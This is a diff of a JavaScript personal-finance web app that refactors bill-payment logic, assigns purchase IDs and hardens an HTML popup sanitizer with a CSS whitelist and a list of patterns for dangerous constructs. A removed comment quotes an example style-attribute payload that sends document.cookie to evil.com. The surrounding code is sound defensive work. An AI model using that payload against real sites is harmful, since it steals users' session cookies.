@@ -824,8 +824,6 @@ async function entrarNoPerfil(index) {
 
         perfilAtivo = usuarioLogado.perfis[index];
 
-        localStorage.setItem('granaevo_perfilAtivoId', perfilAtivo.id);
-
         await carregarDadosPerfil(perfilAtivo.id);
         atualizarReferenciasGlobais();
 
@@ -2034,6 +2032,22 @@ function rollbackArray(arrayAtual, snapshotObj) {
     snapshotObj.forEach(item => arrayAtual.push(item));
 }
 
+// ✅ CORREÇÃO: avancarMes declarada FORA de pagarContaFixa e do bloco try.
+//    Declaração de função no escopo de módulo garante hoisting correto,
+//    comportamento determinístico em todos os motores JS, e acessibilidade
+//    dentro do try sem depender de hoisting condicional.
+function _avancarMes(vencimentoISO) {
+    if (!/^\d{4}-\d{2}-\d{2}$/.test(vencimentoISO)) {
+        const fallback = new Date();
+        fallback.setMonth(fallback.getMonth() + 1);
+        return fallback.toISOString().slice(0, 10);
+    }
+    let [y, m, d] = vencimentoISO.split('-').map(Number);
+    m++;
+    if (m > 12) { m = 1; y++; }
+    return [y, String(m).padStart(2, '0'), String(d).padStart(2, '0')].join('-');
+}
+
 function pagarContaFixa(id, valorPago) {
     const conta = contasFixas.find(c => c.id === id);
     if (!conta) return;
@@ -2053,9 +2067,7 @@ function pagarContaFixa(id, valorPago) {
         return;
     }
 
-    // ✅ FIX #8: Remove override por confirmação — divergência bloqueia sem exceção
-    //    Versão anterior permitia pagar R$0,01 com confirmação (fraude trivial)
-    //    Tolerância de R$0,05 apenas para arredondamento de parcelas
+    // ✅ Tolerância de R$0,05 apenas para arredondamento de parcelas
     if (Math.abs(valorSeguro - conta.valor) > 0.05) {
         alert(
             `❌ Valor divergente! Pagamento bloqueado.\n\n` +
@@ -2068,147 +2080,125 @@ function pagarContaFixa(id, valorPago) {
         return;
     }
 
-    // ✅ Guarda referência original ANTES do try
     const contaOriginal = conta;
 
-    // ✅ FIX #6: Snapshots declarados fora — inicializados com array vazio como fallback
-    //    seguro, evitando crash de undefined.forEach no catch
+    // ✅ Snapshots declarados fora do try — arrays vazios como fallback seguro
     let snapshotTransacoes  = [];
     let snapshotContasFixas = [];
     let snapshotCartoes     = [];
 
     try {
-        // ✅ structuredClone dentro do try — se falhar, catch encontra arrays vazios
-        //    mas ainda seguros para .forEach (não crasham)
         snapshotTransacoes  = structuredClone(transacoes);
         snapshotContasFixas = structuredClone(contasFixas);
         snapshotCartoes     = structuredClone(cartoesCredito);
 
-        function avancarMes(vencimentoISO) {
-    if (!/^\d{4}-\d{2}-\d{2}$/.test(vencimentoISO)) {
-        const fallback = new Date();
-        fallback.setMonth(fallback.getMonth() + 1);
-        return fallback.toISOString().slice(0, 10);
-    }
-    let [y, m, d] = vencimentoISO.split('-').map(Number);
-    m++;
-    if (m > 12) { m = 1; y++; }
-    return [y, String(m).padStart(2, '0'), String(d).padStart(2, '0')].join('-');
-}
+        const dh = agoraDataHora();
+        const descricaoSegura = String(conta.descricao || '').slice(0, 100);
 
-const dh = agoraDataHora();
-// ✅ nextTransId++ removido — banco gera ID via gen_random_uuid()
-const descricaoSegura = String(conta.descricao || '').slice(0, 100);
+        transacoes.push({
+            categoria:   'saida',
+            tipo:        'Conta Fixa',
+            descricao:   `${descricaoSegura} (pagamento mensal)`,
+            valor:       parseFloat(valorSeguro.toFixed(2)),
+            data:        dh.data,
+            hora:        dh.hora,
+            contaFixaId: id
+        });
 
-transacoes.push({
-    // ✅ Sem campo id — banco gera automaticamente ao persistir
-    categoria:   'saida',
-    tipo:        'Conta Fixa',
-    descricao:   `${descricaoSegura} (pagamento mensal)`,
-    valor:       parseFloat(valorSeguro.toFixed(2)),
-    data:        dh.data,
-    hora:        dh.hora,
-    contaFixaId: id   // ✅ passa direto — compatível com número e UUID string
-});
+        // ── FATURA DE CARTÃO ──────────────────────────────────────────────
+        if (conta.tipoContaFixa === 'fatura_cartao' && conta.compras && conta.compras.length > 0) {
+            let cartaoRef = cartoesCredito.find(c => c.id === conta.cartaoId);
 
-// FATURA DE CARTÃO
-if (conta.tipoContaFixa === 'fatura_cartao' && conta.compras && conta.compras.length > 0) {
-    let cartaoRef = cartoesCredito.find(c => c.id === conta.cartaoId);
+            conta.compras.forEach(compra => {
+                if (typeof compra.parcelaAtual  !== 'number' || !isFinite(compra.parcelaAtual))  return;
+                if (typeof compra.totalParcelas !== 'number' || !isFinite(compra.totalParcelas)) return;
+                if (typeof compra.valorParcela  !== 'number' || !isFinite(compra.valorParcela))  return;
+                if (compra.parcelaAtual  < 1)         return;
+                if (compra.totalParcelas < 1)         return;
+                if (compra.valorParcela  <= 0)        return;
+                if (compra.valorParcela  > 9_999_999) return;
 
-    conta.compras.forEach(compra => {
-        // ✅ Validação completa do objeto compra antes de qualquer operação
-        //    Impede valorParcela negativo que AUMENTAVA o limite do cartão artificialmente
-        if (typeof compra.parcelaAtual  !== 'number' || !isFinite(compra.parcelaAtual))  return;
-        if (typeof compra.totalParcelas !== 'number' || !isFinite(compra.totalParcelas)) return;
-        if (typeof compra.valorParcela  !== 'number' || !isFinite(compra.valorParcela))  return;
-        if (compra.parcelaAtual  < 1)         return; // ✅ sem parcelas negativas
-        if (compra.totalParcelas < 1)         return;
-        if (compra.valorParcela  <= 0)        return; // ✅ bloqueia negativo/zero
-        if (compra.valorParcela  > 9_999_999) return; // ✅ bloqueia valor absurdo
+                if (compra.parcelaAtual <= compra.totalParcelas) {
+                    compra.parcelaAtual++;
+                    if (cartaoRef) {
+                        const parcela = parseFloat(compra.valorParcela);
+                        cartaoRef.usado = (cartaoRef.usado || 0) - parcela;
+                        if (cartaoRef.usado < 0) cartaoRef.usado = 0;
+                    }
+                }
+            });
 
-        if (compra.parcelaAtual <= compra.totalParcelas) {
-            compra.parcelaAtual++;
+            conta.compras = conta.compras.filter(c => c.parcelaAtual <= c.totalParcelas);
+
+            if (conta.compras.length === 0) {
+                contasFixas = contasFixas.filter(c => c.id !== id);
+                salvarDados();
+                atualizarTudo();
+                conta._processando = false;
+                alert('✅ Todas as parcelas pagas! Fatura quitada.');
+                return;
+            }
+
+            conta.valor = conta.compras.reduce((sum, c) => {
+                const p = parseFloat(c.valorParcela);
+                return sum + (isFinite(p) && p > 0 ? p : 0);
+            }, 0);
+
+            // ✅ Usa _avancarMes (escopo de módulo, não bloco try)
+            conta.vencimento = _avancarMes(conta.vencimento);
+            conta.pago = false;
+
+            salvarDados();
+            atualizarTudo();
+            conta._processando = false;
+            alert(`✅ Fatura paga! Próxima fatura: ${formatBRL(conta.valor)} em ${formatarDataBR(conta.vencimento)}`);
+            return;
+        }
+
+        // ── CONTA COM PARCELAS DE CARTÃO ──────────────────────────────────
+        if (conta.cartaoId && conta.totalParcelas && conta.parcelaAtual) {
+            let cartaoRef = cartoesCredito.find(c => c.id === conta.cartaoId);
             if (cartaoRef) {
-                const parcela = parseFloat(compra.valorParcela);
-                // ✅ Seguro: parcela já validada como positiva acima
-                cartaoRef.usado = (cartaoRef.usado || 0) - parcela;
+                cartaoRef.usado = (cartaoRef.usado || 0) - valorSeguro;
                 if (cartaoRef.usado < 0) cartaoRef.usado = 0;
             }
+
+            if (conta.parcelaAtual < conta.totalParcelas) {
+                conta.parcelaAtual++;
+                // ✅ Usa _avancarMes (escopo de módulo)
+                conta.vencimento = _avancarMes(conta.vencimento);
+                conta.pago = false;
+            } else {
+                contasFixas = contasFixas.filter(c => c.id !== conta.id);
+            }
+
+            salvarDados();
+            atualizarTudo();
+            conta._processando = false;
+            alert('✅ Parcela paga! O lembrete foi atualizado.');
+            return;
         }
-    });
 
-    conta.compras = conta.compras.filter(c => c.parcelaAtual <= c.totalParcelas);
+        // ── CONTA RECORRENTE (sem parcelas) ──────────────────────────────
+        // ✅ Usa _avancarMes (escopo de módulo)
+        conta.vencimento = _avancarMes(conta.vencimento);
+        conta.pago = false;
 
-    if (conta.compras.length === 0) {
-        contasFixas = contasFixas.filter(c => c.id !== id);
         salvarDados();
         atualizarTudo();
         conta._processando = false;
-        alert('✅ Todas as parcelas pagas! Fatura quitada.');
-        return;
+        alert('✅ Pagamento realizado e vencimento atualizado para o próximo mês!');
+
+    } catch (erro) {
+        console.error('❌ Erro no pagamento, revertendo estado:', erro);
+
+        rollbackArray(transacoes,     snapshotTransacoes);
+        rollbackArray(contasFixas,    snapshotContasFixas);
+        rollbackArray(cartoesCredito, snapshotCartoes);
+
+        contaOriginal._processando = false;
+        alert('❌ Erro ao processar pagamento. Nenhuma alteração foi salva.');
     }
-
-    conta.valor = conta.compras.reduce((sum, c) => {
-        // ✅ Revalida valorParcela aqui pois compras podem ter sido filtradas
-        const p = parseFloat(c.valorParcela);
-        return sum + (isFinite(p) && p > 0 ? p : 0);
-    }, 0);
-
-    conta.vencimento = avancarMes(conta.vencimento);
-    conta.pago = false;
-
-    salvarDados();
-    atualizarTudo();
-    conta._processando = false;
-    alert(`✅ Fatura paga! Próxima fatura: ${formatBRL(conta.valor)} em ${formatarDataBR(conta.vencimento)}`);
-    return;
-}
-
-// CONTA COM PARCELAS DE CARTÃO
-if (conta.cartaoId && conta.totalParcelas && conta.parcelaAtual) {
-    let cartaoRef = cartoesCredito.find(c => c.id === conta.cartaoId);
-    if (cartaoRef) {
-        cartaoRef.usado = (cartaoRef.usado || 0) - valorSeguro;
-        if (cartaoRef.usado < 0) cartaoRef.usado = 0;
-    }
-
-    if (conta.parcelaAtual < conta.totalParcelas) {
-        conta.parcelaAtual++;
-        conta.vencimento = avancarMes(conta.vencimento);
-        conta.pago = false;
-    } else {
-        contasFixas = contasFixas.filter(c => c.id !== conta.id);
-    }
-
-    salvarDados();
-    atualizarTudo();
-    conta._processando = false;
-    alert('✅ Parcela paga! O lembrete foi atualizado.');
-    return;
-}
-
-// CONTA RECORRENTE (sem parcelas)
-conta.vencimento = avancarMes(conta.vencimento);
-conta.pago = false;
-
-salvarDados();
-atualizarTudo();
-conta._processando = false;
-alert('✅ Pagamento realizado e vencimento atualizado para o próximo mês!');
-
-} catch (erro) {
-    console.error('❌ Erro no pagamento, revertendo estado:', erro);
-
-    // ✅ Snapshots são arrays (possivelmente vazios, nunca undefined)
-    //    então .forEach nunca crashará aqui
-    rollbackArray(transacoes,     snapshotTransacoes);
-    rollbackArray(contasFixas,    snapshotContasFixas);
-    rollbackArray(cartoesCredito, snapshotCartoes);
-
-    contaOriginal._processando = false;
-
-    alert('❌ Erro ao processar pagamento. Nenhuma alteração foi salva.');
-}
 }
 
 // ✅ Token de versão declarado fora — persiste entre chamadas
@@ -2281,13 +2271,48 @@ function fecharPopup() {
 
 function sanitizarHTMLPopup(html) {
     const parser = new DOMParser();
-    const doc = parser.parseFromString(html, 'text/html');
+    const doc    = parser.parseFromString(html, 'text/html');
 
-    // ✅ SVG incluído — suporta handlers como onload/onbegin no elemento raiz
+    // ✅ Tags estruturalmente perigosas — removidas completamente
     const tagsProibidas = ['script', 'iframe', 'object', 'embed', 'link', 'meta', 'base', 'form', 'svg'];
     tagsProibidas.forEach(tag => {
         doc.querySelectorAll(tag).forEach(el => el.remove());
     });
+
+    // ✅ Propriedades CSS permitidas via whitelist.
+    //    Qualquer propriedade fora desta lista é removida do atributo style.
+    //    Isso bloqueia: expression(), -moz-binding, propriedades de posição absoluta
+    //    que poderiam sobrepor elementos, e vazamento via url() / image-set().
+    const CSS_PROPS_PERMITIDAS = new Set([
+        'color', 'background', 'background-color', 'font-size', 'font-weight',
+        'font-family', 'font-style', 'text-align', 'text-decoration',
+        'margin', 'margin-top', 'margin-bottom', 'margin-left', 'margin-right',
+        'padding', 'padding-top', 'padding-bottom', 'padding-left', 'padding-right',
+        'border', 'border-top', 'border-bottom', 'border-left', 'border-right',
+        'border-radius', 'border-color', 'border-width', 'border-style',
+        'width', 'height', 'max-width', 'min-width', 'max-height', 'min-height',
+        'display', 'flex', 'flex-direction', 'flex-wrap', 'flex',
+        'align-items', 'align-content', 'justify-content', 'justify-self', 'gap',
+        'grid-template-columns', 'grid-template-rows', 'grid-column', 'grid-row',
+        'overflow', 'overflow-x', 'overflow-y', 'white-space',
+        'opacity', 'visibility', 'cursor',
+        'box-shadow', 'text-shadow',
+        'line-height', 'letter-spacing', 'word-break',
+        'transition', 'animation',
+        'position', 'top', 'right', 'bottom', 'left', 'z-index',
+    ]);
+
+    // ✅ Padrões CSS sempre perigosos — bloqueados mesmo que a propriedade seja permitida
+    const CSS_PADROES_PERIGOSOS = [
+        /url\s*\(/gi,           // url() — requisição externa, exfiltração de dados
+        /expression\s*\(/gi,   // expression() — execução JS em IE
+        /-moz-binding/gi,      // binding XBL em Firefox antigo
+        /javascript\s*:/gi,    // javascript: URI em valores CSS
+        /vbscript\s*:/gi,      // vbscript: URI
+        /@import/gi,           // @import — carregamento de CSS externo
+        /behavior\s*:/gi,      // behavior — IE HTC
+        /image-set\s*\(/gi,    // image-set() — similar a url()
+    ];
 
     doc.body.querySelectorAll('*').forEach(el => {
         const nomesAtributos = typeof el.getAttributeNames === 'function'
@@ -2298,7 +2323,7 @@ function sanitizarHTMLPopup(html) {
             const nome = nomeOriginal.toLowerCase().trim();
             const val  = (el.getAttribute(nomeOriginal) || '').toLowerCase().replace(/[\s\r\n\t]/g, '');
 
-            // ✅ Bloqueia event handlers — inclui handlers SVG como onbegin, onend, onrepeat
+            // ✅ Bloqueia todos os event handlers (on* = onclick, onload, onbegin, etc.)
             if (nome.startsWith('on')) {
                 el.removeAttribute(nomeOriginal);
                 return;
@@ -2311,26 +2336,41 @@ function sanitizarHTMLPopup(html) {
                 return;
             }
 
-            // ✅ NOVO: Sanitiza atributo style — remove url() externos
-            //    Impede: style="background:url('//evil.com/?c='+document.cookie)"
-            //    Browsers modernos bloqueiam js em CSS mas url() pode exfiltrar via requisição HTTP
+            // ✅ Sanitização abrangente do atributo style
             if (nome === 'style') {
                 const valOriginal = el.getAttribute(nomeOriginal) || '';
-                const valLimpo    = valOriginal.replace(/url\s*\([^)]*\)/gi, '');
-                if (valLimpo !== valOriginal) {
-                    if (valLimpo.trim()) {
-                        el.setAttribute(nomeOriginal, valLimpo);
-                    } else {
-                        el.removeAttribute(nomeOriginal);
-                    }
+
+                // ✅ Bloqueia padrões sempre perigosos, independente da propriedade
+                let valLimpo = valOriginal;
+                CSS_PADROES_PERIGOSOS.forEach(padrao => {
+                    valLimpo = valLimpo.replace(padrao, '/* bloqueado */');
+                });
+
+                // ✅ Filtra propriedades CSS por whitelist
+                //    Faz parse linha a linha e mantém apenas as propriedades permitidas
+                const declaracoesFiltradas = valLimpo
+                    .split(';')
+                    .map(decl => decl.trim())
+                    .filter(decl => {
+                        if (!decl) return false;
+                        const separador = decl.indexOf(':');
+                        if (separador === -1) return false;
+                        const prop = decl.slice(0, separador).trim().toLowerCase();
+                        // ✅ Permite propriedades da whitelist e prefixos vendor (-webkit-, -moz-)
+                        const propBase = prop.replace(/^-(?:webkit|moz|ms|o)-/, '');
+                        return CSS_PROPS_PERMITIDAS.has(prop) || CSS_PROPS_PERMITIDAS.has(propBase);
+                    })
+                    .join('; ');
+
+                if (declaracoesFiltradas.trim()) {
+                    el.setAttribute(nomeOriginal, declaracoesFiltradas);
+                } else {
+                    el.removeAttribute(nomeOriginal);
                 }
-                // ✅ Não remove o atributo style completamente — apenas filtra url()
-                //    Estilos legítimos como color, font-size, display continuam funcionando
                 return;
             }
 
             // ✅ Remove atributos estruturalmente perigosos
-            //    href é permitido se não contiver URI perigosa (já checado acima)
             const atributosProibidos = ['srcdoc', 'formaction', 'xlink:href', 'action'];
             if (atributosProibidos.includes(nome)) {
                 el.removeAttribute(nomeOriginal);
@@ -2609,8 +2649,16 @@ function lancarTransacao() {
             c.tipoContaFixa === 'fatura_cartao'
         );
 
+        // ✅ CORREÇÃO: gera UUID local para cada compra.
+        //    Compras são armazenadas como JSON aninhado no Supabase (não como rows),
+        //    portanto o banco NUNCA gera IDs para objetos dentro do array.
+        //    Sem id, String(undefined) === String(undefined) é true para todas as compras,
+        //    fazendo find() em pagarCompraIndividual/editarCompraFatura/excluirCompraFatura
+        //    retornar sempre a primeira — causando pagar/editar/excluir a compra errada.
         const novaCompra = {
-            // ✅ Sem id — banco gera via gen_random_uuid()
+            id: (typeof crypto !== 'undefined' && crypto.randomUUID)
+                ? crypto.randomUUID()
+                : `compra_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`,
             tipo,
             descricao,
             valorTotal:    valor,
@@ -2622,11 +2670,22 @@ function lancarTransacao() {
 
         if(faturaExistente) {
             if(!faturaExistente.compras) faturaExistente.compras = [];
-            faturaExistente.compras.push(novaCompra);
-            faturaExistente.valor = faturaExistente.compras.reduce((sum, c) => sum + c.valorParcela, 0);
+
+            // ✅ Previne inserção duplicada em caso de double-click
+            const jaExiste = faturaExistente.compras.some(c => c.id === novaCompra.id);
+            if(!jaExiste) {
+                faturaExistente.compras.push(novaCompra);
+            }
+            faturaExistente.valor = faturaExistente.compras.reduce((sum, c) => {
+                const p = parseFloat(c.valorParcela);
+                return sum + (isFinite(p) && p > 0 ? p : 0);
+            }, 0);
         } else {
             contasFixas.push({
-                // ✅ Sem id — banco gera via gen_random_uuid()
+                // ✅ A fatura também recebe UUID — consistência com demais contasFixas
+                id: (typeof crypto !== 'undefined' && crypto.randomUUID)
+                    ? crypto.randomUUID()
+                    : `fatura_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`,
                 descricao:      `Fatura ${cartao.nomeBanco}`,
                 valor:          Number((valor / parcelasSel).toFixed(2)),
                 vencimento:     dataFaturaISO,
@@ -2689,7 +2748,7 @@ function lancarTransacao() {
             tipoSalvo   = 'Reserva';
         }
 
-        // ✅ Sem id — banco gera via gen_random_uuid()
+        // ✅ Sem id — banco gera via gen_random_uuid() (rows individuais no Supabase)
         const t = {
             categoria,
             tipo:    tipoSalvo,
@@ -3523,20 +3582,26 @@ function renderMetaVisual() {
         details.appendChild(cardInsuf);
     }
     
-    line.onclick = function(ev){
-        const rect = line.getBoundingClientRect();
-        const mx = ev.clientX - rect.left;
-        const my = ev.clientY - rect.top;
-        
-        const ponto = (line._points || []).find(p => {
-            const dx = p.x - mx, dy = p.y - my;
-            return Math.sqrt(dx*dx + dy*dy) <= 8;
+    if (!line._clickListenerRegistrado) {
+        line._clickListenerRegistrado = true;
+        line.addEventListener('click', function(ev) {
+            const rect = line.getBoundingClientRect();
+            const mx = ev.clientX - rect.left;
+            const my = ev.clientY - rect.top;
+
+            const ponto = (line._points || []).find(p => {
+                const dx = p.x - mx, dy = p.y - my;
+                return Math.sqrt(dx * dx + dy * dy) <= 8;
+            });
+
+            if (ponto) {
+                mostrarNotificacao(
+                    `${_sanitizeText(ponto.month)}: ${formatBRL(ponto.v)}`,
+                    'info'
+                );
+            }
         });
-        
-        if(ponto) {
-            alert(`Mês: ${ponto.month}\nValor guardado: ${formatBRL(ponto.v)}`);
-        }
-    };
+    }
 }
 
 function abrirRetiradaForm() {
@@ -3772,8 +3837,6 @@ function abrirAnaliseDisciplina(metaId) {
     const analise = analisarDisciplinaRetiradas(metaId);
 
     if (!analise.temDados) {
-        // ✅ CORREÇÃO: id no botão + addEventListener após criarPopup
-        //    onclick="fecharPopup()" era removido pelo sanitizarHTMLPopup — botão ficava morto
         criarPopup(`
             <h3>📊 Análise de Disciplina</h3>
             <div style="text-align:center; padding:40px;">
@@ -3787,9 +3850,57 @@ function abrirAnaliseDisciplina(metaId) {
         return;
     }
 
-    const descricaoSegura = escapeHTML(String(meta.descricao || ''));
-    const ultimaData      = escapeHTML(String(analise.ultimaRetirada.data   || ''));
-    const ultimoMotivo    = escapeHTML(String(analise.ultimaRetirada.motivo || ''));
+    // ✅ CORREÇÃO: todos os valores computados passam por escapeHTML
+    //    mesmo sendo gerados por lógica interna.
+    //    Defesa em profundidade: protege contra refatorações futuras
+    //    que possam inadvertidamente injetar dados do usuário nestes campos.
+    const descricaoSegura      = escapeHTML(String(meta.descricao              || ''));
+    const ultimaData           = escapeHTML(String(analise.ultimaRetirada.data  || ''));
+    const ultimoMotivo         = escapeHTML(String(analise.ultimaRetirada.motivo || ''));
+    const nivelSanitizado      = escapeHTML(String(analise.nivelDisciplina      || ''));
+    const mensagemSanitizada   = escapeHTML(String(analise.mensagemDisciplina   || ''));
+    const totalRetiradaSanit   = escapeHTML(String(Number(analise.totalRetiradas) || 0));
+    const valorTotalSanit      = formatBRL(analise.valorTotalRetirado);
+
+    // ✅ CORREÇÃO: corDisciplina validada contra whitelist de cores hexadecimais seguras
+    //    Impede injeção de CSS arbitrário via interpolação de cor em atributo style.
+    //    Se a cor não passar na validação, cai para a cor padrão segura.
+    const CORES_PERMITIDAS_DISCIPLINA = new Set(['#ff4b4b', '#00ff99', '#ffd166']);
+    const corSegura = CORES_PERMITIDAS_DISCIPLINA.has(analise.corDisciplina)
+        ? analise.corDisciplina
+        : '#ffd166';
+
+    // ✅ CORREÇÃO: distribuições sanitizadas individualmente
+    const distEmergCount  = escapeHTML(String(Number(analise.distribuicao.emergencia.count)   || 0));
+    const distEmergPerc   = escapeHTML(String(Number(analise.distribuicao.emergencia.perc)    || 0));
+    const distPlanCount   = escapeHTML(String(Number(analise.distribuicao.planejado.count)    || 0));
+    const distPlanPerc    = escapeHTML(String(Number(analise.distribuicao.planejado.perc)     || 0));
+    const distInvCount    = escapeHTML(String(Number(analise.distribuicao.investimento.count) || 0));
+    const distInvPerc     = escapeHTML(String(Number(analise.distribuicao.investimento.perc)  || 0));
+    const distOutCount    = escapeHTML(String(Number(analise.distribuicao.outros.count)       || 0));
+    const distOutPerc     = escapeHTML(String(Number(analise.distribuicao.outros.perc)        || 0));
+
+    // ✅ CORREÇÃO: histórico de retiradas sanitizado item a item
+    const historicoHTML = meta.historicoRetiradas
+        .slice()
+        .reverse()
+        .map(r => {
+            const dataSegura   = escapeHTML(String(r.data   || ''));
+            const motivoSeguro = escapeHTML(String(r.motivo || ''));
+            const valorSeguro  = formatBRL(Number(r.valor) || 0);
+            return `
+            <div style="background: rgba(255,255,255,0.03); padding: 10px; border-radius: 8px; margin-bottom: 8px; border-left: 2px solid var(--border);">
+                <div style="display: flex; justify-content: space-between; margin-bottom: 4px;">
+                    <span style="font-size: 0.85rem; color: var(--text-secondary);">${dataSegura}</span>
+                    <span style="font-size: 0.9rem; font-weight: 600; color: #ff4b4b;">${valorSeguro}</span>
+                </div>
+                <div style="font-size: 0.85rem; color: var(--text-primary);">
+                    <strong>Motivo:</strong> ${motivoSeguro}
+                </div>
+            </div>
+            `;
+        })
+        .join('');
 
     criarPopup(`
         <div style="max-height:70vh; overflow-y:auto; padding-right:10px;">
@@ -3798,26 +3909,26 @@ function abrirAnaliseDisciplina(metaId) {
                 Meta: ${descricaoSegura}
             </div>
 
-            <div style="background: linear-gradient(135deg, ${analise.corDisciplina}20, ${analise.corDisciplina}10);
+            <div style="background: linear-gradient(135deg, ${corSegura}20, ${corSegura}10);
                         padding: 20px; border-radius: 12px; margin-bottom: 20px;
-                        border-left: 4px solid ${analise.corDisciplina}; text-align: center;">
+                        border-left: 4px solid ${corSegura}; text-align: center;">
                 <div style="font-size: 0.85rem; color: var(--text-secondary); margin-bottom: 8px;">Nível de Disciplina</div>
-                <div style="font-size: 1.8rem; font-weight: 700; color: ${analise.corDisciplina}; margin-bottom: 12px;">
-                    ${analise.nivelDisciplina}
+                <div style="font-size: 1.8rem; font-weight: 700; color: ${corSegura}; margin-bottom: 12px;">
+                    ${nivelSanitizado}
                 </div>
                 <div style="font-size: 0.9rem; color: var(--text-secondary); line-height: 1.5;">
-                    ${analise.mensagemDisciplina}
+                    ${mensagemSanitizada}
                 </div>
             </div>
 
             <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-bottom: 20px;">
                 <div style="background: rgba(255,255,255,0.05); padding: 14px; border-radius: 10px; text-align: center;">
                     <div style="font-size: 0.85rem; color: var(--text-secondary); margin-bottom: 6px;">Total de Retiradas</div>
-                    <div style="font-size: 1.5rem; font-weight: 700; color: var(--text-primary);">${analise.totalRetiradas}</div>
+                    <div style="font-size: 1.5rem; font-weight: 700; color: var(--text-primary);">${totalRetiradaSanit}</div>
                 </div>
                 <div style="background: rgba(255,255,255,0.05); padding: 14px; border-radius: 10px; text-align: center;">
                     <div style="font-size: 0.85rem; color: var(--text-secondary); margin-bottom: 6px;">Valor Total Retirado</div>
-                    <div style="font-size: 1.5rem; font-weight: 700; color: #ff4b4b;">${formatBRL(analise.valorTotalRetirado)}</div>
+                    <div style="font-size: 1.5rem; font-weight: 700; color: #ff4b4b;">${valorTotalSanit}</div>
                 </div>
             </div>
 
@@ -3828,10 +3939,10 @@ function abrirAnaliseDisciplina(metaId) {
                 <div style="margin-bottom: 12px;">
                     <div style="display: flex; justify-content: space-between; margin-bottom: 6px;">
                         <span style="color: var(--text-primary);">🚨 Emergências</span>
-                        <span style="color: var(--text-secondary);">${analise.distribuicao.emergencia.count} (${analise.distribuicao.emergencia.perc}%)</span>
+                        <span style="color: var(--text-secondary);">${distEmergCount} (${distEmergPerc}%)</span>
                     </div>
                     <div style="width: 100%; height: 10px; background: rgba(255,255,255,0.1); border-radius: 5px; overflow: hidden;">
-                        <div style="width: ${analise.distribuicao.emergencia.perc}%; height: 100%; background: #ff4b4b; transition: width 0.5s;"></div>
+                        <div style="width: ${distEmergPerc}%; height: 100%; background: #ff4b4b; transition: width 0.5s;"></div>
                     </div>
                 </div>
                 ` : ''}
@@ -3840,10 +3951,10 @@ function abrirAnaliseDisciplina(metaId) {
                 <div style="margin-bottom: 12px;">
                     <div style="display: flex; justify-content: space-between; margin-bottom: 6px;">
                         <span style="color: var(--text-primary);">🎯 Compras Planejadas</span>
-                        <span style="color: var(--text-secondary);">${analise.distribuicao.planejado.count} (${analise.distribuicao.planejado.perc}%)</span>
+                        <span style="color: var(--text-secondary);">${distPlanCount} (${distPlanPerc}%)</span>
                     </div>
                     <div style="width: 100%; height: 10px; background: rgba(255,255,255,0.1); border-radius: 5px; overflow: hidden;">
-                        <div style="width: ${analise.distribuicao.planejado.perc}%; height: 100%; background: #00ff99; transition: width 0.5s;"></div>
+                        <div style="width: ${distPlanPerc}%; height: 100%; background: #00ff99; transition: width 0.5s;"></div>
                     </div>
                 </div>
                 ` : ''}
@@ -3852,10 +3963,10 @@ function abrirAnaliseDisciplina(metaId) {
                 <div style="margin-bottom: 12px;">
                     <div style="display: flex; justify-content: space-between; margin-bottom: 6px;">
                         <span style="color: var(--text-primary);">📈 Investimentos</span>
-                        <span style="color: var(--text-secondary);">${analise.distribuicao.investimento.count} (${analise.distribuicao.investimento.perc}%)</span>
+                        <span style="color: var(--text-secondary);">${distInvCount} (${distInvPerc}%)</span>
                     </div>
                     <div style="width: 100%; height: 10px; background: rgba(255,255,255,0.1); border-radius: 5px; overflow: hidden;">
-                        <div style="width: ${analise.distribuicao.investimento.perc}%; height: 100%; background: #6c63ff; transition: width 0.5s;"></div>
+                        <div style="width: ${distInvPerc}%; height: 100%; background: #6c63ff; transition: width 0.5s;"></div>
                     </div>
                 </div>
                 ` : ''}
@@ -3864,10 +3975,10 @@ function abrirAnaliseDisciplina(metaId) {
                 <div style="margin-bottom: 12px;">
                     <div style="display: flex; justify-content: space-between; margin-bottom: 6px;">
                         <span style="color: var(--text-primary);">📄 Outros</span>
-                        <span style="color: var(--text-secondary);">${analise.distribuicao.outros.count} (${analise.distribuicao.outros.perc}%)</span>
+                        <span style="color: var(--text-secondary);">${distOutCount} (${distOutPerc}%)</span>
                     </div>
                     <div style="width: 100%; height: 10px; background: rgba(255,255,255,0.1); border-radius: 5px; overflow: hidden;">
-                        <div style="width: ${analise.distribuicao.outros.perc}%; height: 100%; background: #ffd166; transition: width 0.5s;"></div>
+                        <div style="width: ${distOutPerc}%; height: 100%; background: #ffd166; transition: width 0.5s;"></div>
                     </div>
                 </div>
                 ` : ''}
@@ -3885,21 +3996,7 @@ function abrirAnaliseDisciplina(metaId) {
             <div style="margin-top: 20px;">
                 <h4 style="margin-bottom: 12px; color: var(--text-primary);">📜 Histórico Completo</h4>
                 <div style="max-height: 200px; overflow-y: auto;">
-                    ${meta.historicoRetiradas.slice().reverse().map(r => {
-                        const dataSegura   = escapeHTML(String(r.data   || ''));
-                        const motivoSeguro = escapeHTML(String(r.motivo || ''));
-                        return `
-                        <div style="background: rgba(255,255,255,0.03); padding: 10px; border-radius: 8px; margin-bottom: 8px; border-left: 2px solid var(--border);">
-                            <div style="display: flex; justify-content: space-between; margin-bottom: 4px;">
-                                <span style="font-size: 0.85rem; color: var(--text-secondary);">${dataSegura}</span>
-                                <span style="font-size: 0.9rem; font-weight: 600; color: #ff4b4b;">${formatBRL(r.valor)}</span>
-                            </div>
-                            <div style="font-size: 0.85rem; color: var(--text-primary);">
-                                <strong>Motivo:</strong> ${motivoSeguro}
-                            </div>
-                        </div>
-                        `;
-                    }).join('')}
+                    ${historicoHTML}
                 </div>
             </div>
         </div>
@@ -3907,8 +4004,6 @@ function abrirAnaliseDisciplina(metaId) {
         <button class="btn-primary" id="btnFecharAnalise" style="width:100%; margin-top:16px;">Fechar</button>
     `);
 
-    // ✅ CORREÇÃO: addEventListener no botão Fechar em vez de onclick inline
-    //    onclick="fecharPopup()" era removido pelo sanitizarHTMLPopup — botão ficava morto
     document.getElementById('btnFecharAnalise').addEventListener('click', fecharPopup);
 }
 
@@ -3923,47 +4018,56 @@ function atualizarTelaCartoes() {
     grid.innerHTML = '';
 
     cartoesCredito.forEach(c => {
-        const disponivel       = c.limite - (c.usado || 0);
-        const parcelasAtivas   = contasFixas.filter(fx => fx.cartaoId === c.id && fx.totalParcelas);
+        const disponivel        = c.limite - (c.usado || 0);
+        const parcelasAtivas    = contasFixas.filter(fx => fx.cartaoId === c.id && fx.totalParcelas);
